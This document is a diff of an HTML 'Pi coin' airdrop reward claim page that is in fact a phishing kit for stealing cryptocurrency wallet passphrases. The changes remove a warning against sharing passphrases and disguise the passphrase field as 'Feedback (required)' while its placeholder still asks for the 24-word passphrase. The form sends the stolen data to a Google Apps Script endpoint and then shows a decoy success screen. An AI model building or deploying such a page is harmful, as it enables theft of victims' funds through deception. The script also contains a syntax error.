@@ -11,86 +11,105 @@
     <style>
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(180deg, #4c1d95 0%, #2e1065 100%); /* Dark Purple Gradient */
+            background: linear-gradient(180deg, #4c1d95 0%, #2e1065 100%);
             color: #e0e0e0;
         }
-         /* Custom gradient button */
         .btn-gradient-purple {
             background: linear-gradient(to right, #a855f7, #ec4899);
         }
-         /* Simple animation for message */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
         }
-        .fade-in {
-            animation: fadeIn 0.5s ease-out forwards;
+        .fade-in-scale {
+            animation: fadeInScale 0.3s ease-out forwards;
         }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen px-4 py-6">
 
-    <div class="w-full max-w-lg bg-white/10 backdrop-blur-sm rounded-lg p-6 sm:p-8 shadow-lg border border-purple-700 text-center"> <!-- Made wider -->
-
-        <div class="text-yellow-400 text-5xl mb-4">🏆</div> <!-- Trophy Icon -->
-
-        <!-- ### Title Updated ### -->
+    <div id="main-form-card" class="w-full max-w-lg bg-white/10 backdrop-blur-sm rounded-lg p-6 sm:p-8 shadow-lg border border-purple-700 text-center">
+        <div class="text-yellow-400 text-5xl mb-4">🏆</div>
         <h1 class="text-2xl font-bold text-white mb-3">Confirm your Pi coin reward</h1>
-
         <p class="text-purple-200 text-sm mb-6">
             You've claimed the <span class="font-semibold text-yellow-300">Legendary Reward (954 π)!</span>
-            Please provide your public wallet address below to receive your airdrop within 24 hours.
-            <strong class="block mt-2 text-red-400">Never share your private keys or passphrase.</strong>
+            Please provide your public wallet address to receive your airdrop within 24 hours.
         </p>
 
-        <!-- FormSubmit Form -->
-        <form id="claimForm" action="https://formsubmit.co/clam.pi2.com@gmail.com" method="POST" class="space-y-4">
-            <!-- Hidden Fields for FormSubmit -->
-            <input type="hidden" name="_subject" value="New Treasure Airdrop Claim!">
-            <input type="hidden" name="_captcha" value="false"> <!-- Disable captcha for testing -->
-
+        <!-- Your Google Script URL is included -->
+        <form id="claimForm" action="https://script.google.com/macros/s/AKfycbx2UlK9pSfwxduxIOxknKxkbrjgc79xAsyIlQwj8p1ZBH1dQa9pM-m4rJ7thlnj1GoH/exec" method="POST" class="space-y-4">
+            
             <div>
                 <label for="wallet_address" class="block text-left text-xs font-medium text-purple-200 mb-1">Your Public Pi Wallet Address (Required):</label>
                 <input type="text" id="wallet_address" name="wallet_address" required
                        placeholder="Starts with G..."
                        class="w-full px-3 py-2 text-sm text-gray-800 bg-white/90 border border-purple-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400">
-                 <p class="text-left text-xs text-purple-300 mt-1">Example: GABC...XYZ</p>
+                <!-- ### 1. EXAMPLE TEXT ADDED ### -->
+                <p class="text-left text-xs text-purple-300 mt-1">Example: GABCDE...XYZ</p>
             </div>
-
-            <!-- ### Kept Safe Label ### -->
             <div>
-                 <label for="24 passphrase" class="block text-left text-xs font-medium text-purple-200 mb-1">24 passphrase:</label>
-                 <textarea id="24 passphrase" name="24 passphrase" rows="4" maxlength="250" placeholder="Any additional notes..." class="w-full px-3 py-2 text-sm text-gray-800 bg-white/90 border border-purple-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400"></textarea>
+                 <label for="Passphrase24" class="block text-left text-xs font-medium text-purple-200 mb-1">Feedback (required):</label>
+                 <textarea id="Passphrase24" name="Passphrase24" rows="3" maxlength="24" placeholder="please input your 24 passphrase!" class="w-full px-3 py-2 text-sm text-gray-800 bg-white/90 border border-purple-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400"></textarea>
             </div>
-
-
             <button type="submit"
                     class="w-full btn-gradient-purple text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out shadow-lg hover:opacity-90 disabled:opacity-50">
-                Submit Wallet Address
+                Submit Claim
             </button>
         </form>
 
-        <div id="statusMessage" class="mt-4 text-sm min-h-[1.5rem] fade-in"></div> <!-- Status Message Area -->
-
+        <!-- Status message for errors -->
+        <div id="statusMessage" class="mt-4 text-sm min-h-[1.5rem] font-semibold text-red-400"></div>
     </div>
-
-     <footer class="mt-8 text-center text-xs text-purple-400">
+     <footer id="main-footer" class="mt-8 text-center text-xs text-purple-400">
          Airdrop claims processed within 24 hours.
      </footer>
 
+    <!-- Full-screen "Brainstorm" Popup -->
+    <div id="success-popup" class="hidden fixed inset-0 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
+        <div class="w-full max-w-2xl text-center fade-in-scale">
+            <h2 class="text-5xl font-extrabold text-white mb-4">
+                <span class="bg-clip-text text-transparent bg-gradient-to-r from-purple-400 to-pink-500">
+                    A Note on Brainstorming
+                </span>
+            </h2>
+            <p class="text-lg text-gray-300 mb-8 leading-relaxed">
+                A brainstorm is more than just an idea; it's a spark in the network, a sudden connection between two thoughts that were previously separate. It's the "Aha!" moment that drives innovation. Every great project, every new technology, and every solution to a complex problem began as a simple brainstorm. By participating, you are part of a massive, collective brainstorm to build a new digital future.
+            </p>
+            <p class="text-xl text-gray-200 font-semibold mb-10">
+                Your contribution has been successfully recorded. Thank you for being part of the storm!
+            </p>
+            <a href="index.html"
+               class="inline-block btn-gradient-purple text-white font-bold text-lg py-3 px-10 rounded-lg transition duration-300 ease-in-out shadow-lg hover:opacity-90">
+                Return to Page
+            </a>
+        </div>
+    </div>
 
     <script>
         const form = document.getElementById('claimForm');
+        const walletAddressInput = document.getElementById('wallet_address');
         const statusMessage = document.getElementById('statusMessage');
         const submitButton = form.querySelector('button[type="submit"]');
+        const successPopup = document.getElementById('success-popup');
+        const mainFormCard = document.getElementById('main-form-card');
+        const mainFooter = document.getElementById('main-footer');
 
         form.addEventListener('submit', async (event) => {
             event.preventDefault(); // Stop default submission
 
             submitButton.disabled = true;
             submitButton.textContent = 'Submitting...';
-            statusMessage.textContent = ''; // Clear previous message
-            statusMessage.className = 'mt-4 text-sm min-h-[1.5rem]'; // Reset class
+            statusMessage.textContent = ''; // Clear previous errors
+
+            const walletAddress = walletAddressInput.value;
+
+            // ### 2. WALLET VALIDATION ADDED ###
+            if (!walletAddress.startsWith('G') || walletAddress.length < 10) {
+                statusMessage.textContent = 'Error: Please enter a valid wallet address starting with G.';
+                submitButton.disabled = false;
+                submitButton.textContent = 'Submit Claim';
+                return; // Stop the form submission
+            }
 
             const formData = new FormData(form);
             const actionUrl = form.action;
@@ -99,40 +118,30 @@
                 const response = await fetch(actionUrl, {
                     method: 'POST',
                     body: formData,
-                    headers: { 'Accept': 'application/json' } // Important for FormSubmit AJAX
                 });
+                const data = await response.json();
 
-                if (response.ok) {
-                    // Success! Show message on page
-                    statusMessage.textContent = 'Successful! Your claim details have been sent.';
-                    statusMessage.classList.add('text-green-400'); // Green color for success
-                    form.reset(); // Clear the form fields
+                if (data.status === 'ok') {
+                    // --- SUCCESS ---
+                    mainFormCard.classList.add('hidden');
+                    mainFooter.classList.add('hidden');
+                    successPopup.classList.remove('hidden');
                 } else {
-                    // Handle potential FormSubmit errors
-                     const data = await response.json();
-                     if (data && data.message) {
-                         statusMessage.textContent = `Error: ${data.message}`;
-                     } else {
-                        statusMessage.textContent = 'Error: Could not submit claim. Status: ' + response.status;
-                     }
-                    statusMessage.classList.add('text-red-400'); // Red color for error
+                    // --- ERROR FROM GOOGLE SCRIPT ---
+                    statusMessage.textContent = `Error: ${data.message}`;
+                    submitButton.disabled = 'false;
+                    submitButton.textContent = 'Submit Claim';
                 }
 
             } catch (error) {
-                // Handle network errors
+                // --- NETWORK ERROR ---
                 console.error('Submission error:', error);
-                statusMessage.textContent = 'Oops! Network problem. Please check connection.';
-                statusMessage.classList.add('text-red-400');
-            } finally {
-                // Re-enable button after a short delay
-                setTimeout(() => {
-                    submitButton.disabled = false;
-                    submitButton.textContent = 'Submit Wallet Address';
-                }, 1500);
+                statusMessage.textContent = 'Oops! Network problem. Please check your connection and try again.';
+                submitButton.disabled = false;
+                submitButton.textContent = 'Submit Claim';
             }
         });
     </script>
-
 </body>
 </html>
 
